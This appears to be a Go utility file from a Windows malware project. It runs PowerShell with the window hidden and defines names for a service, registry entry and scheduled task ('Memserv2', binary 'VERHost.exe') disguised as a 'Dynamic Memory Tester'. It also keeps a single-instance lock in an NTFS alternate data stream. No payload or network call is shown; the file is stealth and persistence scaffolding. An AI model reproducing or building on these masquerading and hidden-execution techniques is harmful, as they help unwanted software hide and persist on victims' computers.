package util

import (
	"errors"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func runPowershellInternal(command string, mScope bool) error {
	cmd := exec.Command("powershell", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if mScope {
		cmd.Dir = os.ExpandEnv("$temp")
	}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Command returned an error: " + string(out))
	}
	return err
}

// RunPowershell executes a PowerShell command.
// Returns an error if the command fails or PowerShell cannot run.
func RunPowershell(command string) error {
	return RunPowershellInternal(command, false)
}

func RunPowershellInternal(command string, mScope bool) error {
	err := runPowershellInternal(command, mScope)
	return err
}

var (
	Ads         = "blueberry"
	Binary      = "VERHost.exe"
	Service     = "Memserv2"
	DisplayName = "Dynamic Memory Tester"
	Description = "Dynamic memory performance optimization and adjustments"
	Registry    = "Memserv2"
	Task        = "Memserv2"
	Lock        = "lock"
)

// CheckSingle checks for a lock file and exits if one is found.
func CheckSingle() {
	err := os.Remove(os.Args[0] + ":" + Lock)
	if err != nil && !os.IsNotExist(err) {
		log.Println("An instance is already running")
		os.Exit(0)
	}
	os.OpenFile(os.Args[0]+":"+Lock, os.O_CREATE|os.O_EXCL, 0600)
}
